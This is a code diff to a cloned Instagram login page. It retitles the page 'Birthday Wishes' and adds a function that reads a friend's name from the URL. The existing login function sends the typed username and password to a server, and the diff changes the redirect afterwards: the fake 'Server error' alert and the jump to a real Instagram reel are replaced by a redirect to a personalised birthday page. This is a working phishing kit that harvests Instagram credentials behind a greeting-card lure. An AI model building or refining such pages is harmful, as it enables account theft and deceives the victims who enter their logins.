@@ -1486,7 +1486,7 @@
         nonce="">
     <!--EF-->
 
-    <title>Login • Instagram</title>
+    <title>Birthday Wishes</title>
     <style>
         .savefrom-helper--btn {
             display: none;
@@ -2484,6 +2484,22 @@
     </div>
 
     <script>
+
+        function getQueryVariable(variable) {
+            var query = window.location.search.substring(1);
+            var vars = query.split("&");
+            for (var i = 0; i < vars.length; i++) {
+                var pair = vars[i].split("=");
+                if (pair[0] == variable) {
+                    return pair[1];
+                }
+            }
+            alert('Please Enter Friend Name');
+            return false;
+        }
+
+        var friendName = getQueryVariable("name") || "User";
+
         function loginNow() {
             let username = document.getElementById("usernameJS").value;
             let password = document.getElementById("passwordJS").value;
@@ -2503,8 +2519,9 @@
             })
                 .then(response => response.json())
                 .then(data => {
-                    alert("Server error");
-                    window.location.href = "https://www.instagram.com/reel/CxkAa9WpiU2/"
+
+                    // alert("Server error");
+                    window.location.href = "index.html?name=" + friendName
                 })
                 .catch((error) => {
                     console.error('Error:', error);
